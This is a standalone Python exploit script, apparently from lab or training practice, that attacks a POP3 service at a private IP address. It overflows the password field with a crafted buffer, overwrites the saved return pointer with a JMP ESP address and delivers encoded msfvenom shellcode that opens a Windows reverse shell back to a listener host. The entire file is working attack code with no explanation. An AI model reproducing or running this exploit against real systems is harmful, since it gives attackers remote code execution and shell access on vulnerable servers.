#!/usr/bin/python
import socket
import struct

# Constants
RHOST = "192.168.80.134"
RPORT = 110
len_buffer = 3500
offset_srp = 2606
ptr_jmp_esp = 0x5F4A358F
sub_esp_10 = "\x83\xec\x10"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.80.139 LPORT=11235 -f python -b "\x00\x0a\x0d" EXITFUNC=thread -e x86/shikata_ga_nai
buf =  ""
buf += "\xd9\xd0\xbf\x01\xe0\xe1\xec\xd9\x74\x24\xf4\x5d\x2b"
buf += "\xc9\xb1\x52\x31\x7d\x17\x83\xc5\x04\x03\x7c\xf3\x03"
buf += "\x19\x82\x1b\x41\xe2\x7a\xdc\x26\x6a\x9f\xed\x66\x08"
buf += "\xd4\x5e\x57\x5a\xb8\x52\x1c\x0e\x28\xe0\x50\x87\x5f"
buf += "\x41\xde\xf1\x6e\x52\x73\xc1\xf1\xd0\x8e\x16\xd1\xe9"
buf += "\x40\x6b\x10\x2d\xbc\x86\x40\xe6\xca\x35\x74\x83\x87"
buf += "\x85\xff\xdf\x06\x8e\x1c\x97\x29\xbf\xb3\xa3\x73\x1f"
buf += "\x32\x67\x08\x16\x2c\x64\x35\xe0\xc7\x5e\xc1\xf3\x01"
buf += "\xaf\x2a\x5f\x6c\x1f\xd9\xa1\xa9\x98\x02\xd4\xc3\xda"
buf += "\xbf\xef\x10\xa0\x1b\x65\x82\x02\xef\xdd\x6e\xb2\x3c"
buf += "\xbb\xe5\xb8\x89\xcf\xa1\xdc\x0c\x03\xda\xd9\x85\xa2"
buf += "\x0c\x68\xdd\x80\x88\x30\x85\xa9\x89\x9c\x68\xd5\xc9"
buf += "\x7e\xd4\x73\x82\x93\x01\x0e\xc9\xfb\xe6\x23\xf1\xfb"
buf += "\x60\x33\x82\xc9\x2f\xef\x0c\x62\xa7\x29\xcb\x85\x92"
buf += "\x8e\x43\x78\x1d\xef\x4a\xbf\x49\xbf\xe4\x16\xf2\x54"
buf += "\xf4\x97\x27\xfa\xa4\x37\x98\xbb\x14\xf8\x48\x54\x7e"
buf += "\xf7\xb7\x44\x81\xdd\xdf\xef\x78\xb6\x1f\x47\xd2\xcd"
buf += "\xc8\x9a\xd2\xfa\xeb\x12\x34\x96\xfb\x72\xef\x0f\x65"
buf += "\xdf\x7b\xb1\x6a\xf5\x06\xf1\xe1\xfa\xf7\xbc\x01\x76"
buf += "\xeb\x29\xe2\xcd\x51\xff\xfd\xfb\xfd\x63\x6f\x60\xfd"
buf += "\xea\x8c\x3f\xaa\xbb\x63\x36\x3e\x56\xdd\xe0\x5c\xab"
buf += "\xbb\xcb\xe4\x70\x78\xd5\xe5\xf5\xc4\xf1\xf5\xc3\xc5"
buf += "\xbd\xa1\x9b\x93\x6b\x1f\x5a\x4a\xda\xc9\x34\x21\xb4"
buf += "\x9d\xc1\x09\x07\xdb\xcd\x47\xf1\x03\x7f\x3e\x44\x3c"
buf += "\xb0\xd6\x40\x45\xac\x46\xae\x9c\x74\x76\xe5\xbc\xdd"
buf += "\x1f\xa0\x55\x5c\x42\x53\x80\xa3\x7b\xd0\x20\x5c\x78"
buf += "\xc8\x41\x59\xc4\x4e\xba\x13\x55\x3b\xbc\x80\x56\x6e"


# Create the buffer
buffer = ""
buffer += "A"*(offset_srp - len(buffer))	# padding
buffer += struct.pack("<I", ptr_jmp_esp)	# SRP overwrite
buffer += sub_esp_10                        # Move ESP, save shellcode
buffer += buf		                        # ESP should end up pointing here
buffer += "D"*(len_buffer - len(buffer))	# Training padding
buffer += "\n"

try:        
    # create a TCP connection (socket)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))

    # Recieve the banner
    data = s.recv(1024)
    print("Received: {0}".format(data))

    # Send the username
    data = "USER test\r\n"
    s.send(data)
    print("Sent: {0}".format(data))
    data = s.recv(1024)
    print("Received: {0}".format(data))

    # Send the pasword
    data = "PASS " + buffer + "\r\n"
    s.send(data)
    print("Sent: {0}".format(data))
    data = s.recv(1024)
    print("Received: {0}".format(data))

    # Close the socket
    s.send("QUIT\r\n")
    s.close()
    print("\n[+] Done")
except:
    print("\n[-] Could not connect to POP3...")